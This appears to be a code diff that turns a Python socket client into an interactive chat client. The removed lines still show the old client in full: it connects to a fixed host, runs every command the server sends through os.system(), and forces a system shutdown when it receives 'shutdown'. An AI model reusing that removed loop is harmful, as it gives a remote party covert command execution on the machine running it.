@@ -1,16 +1,13 @@
 import socket
 import time
-import os
-import webbrowser
 
-
-
-def start_client(server_host='10.0.30.160', server_port=65432, retry_delay=5):
+def start_client(server_host='127.0.0.1', server_port=65432, retry_delay=5):
+    server_host = input("Enter the server's IP address: ")
+    
     while True:
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         
         print(f"Trying to connect to server at {server_host}:{server_port}...")
-
         try:
             # Attempt to connect to the server
             client_socket.connect((server_host, server_port))
@@ -18,32 +15,22 @@ def start_client(server_host='10.0.30.160', server_port=65432, retry_delay=5):
             
             while True:
                 try:
-                    # Wait for a message from the server
-                    data = client_socket.recv(1024)  # Buffer size of 1024 bytes
-                    if not data:
-                        # If no data is received, assume connection closed by server
-                        print("Connection closed by the server. Reconnecting...")
-                        break  # Break out to retry connecting
+                    # Input from user to send to server
+                    message = input("Enter a message to send to the server (type 'exit' to quit): ")
                     
-                    # Process the received message
-                    message = data.decode('utf-8')
+                    if message.lower() == 'exit':
+                        print("Closing connection to server.")
+                        break
                     
-                    if "shutdown" in message:
-                        print("Shutting down client...")
-                        os.system("shutdown /s /t 1")
-                    elif "crash" in message:
-                        print("Crashing client...")
-                        for x in range(0,1):
-                            webbrowser.open("www.google.com")
-
-                    else:
-                        os.system(message)
+                    # Send the message to the server
+                    client_socket.sendall(message.encode('utf-8'))
                     
-                    # Display the message from the server
-                    print("Message from server:", message)
+                    # Receive the server's response
+                    response = client_socket.recv(1024)
+                    print(f"Response from server: {response.decode('utf-8')}")
                 
                 except Exception as e:
-                    print(f"An error occurred while receiving data: {e}")
+                    print(f"An error occurred while sending or receiving data: {e}")
                     break  # Break out to retry connecting
 
         except (socket.error, socket.timeout) as e:
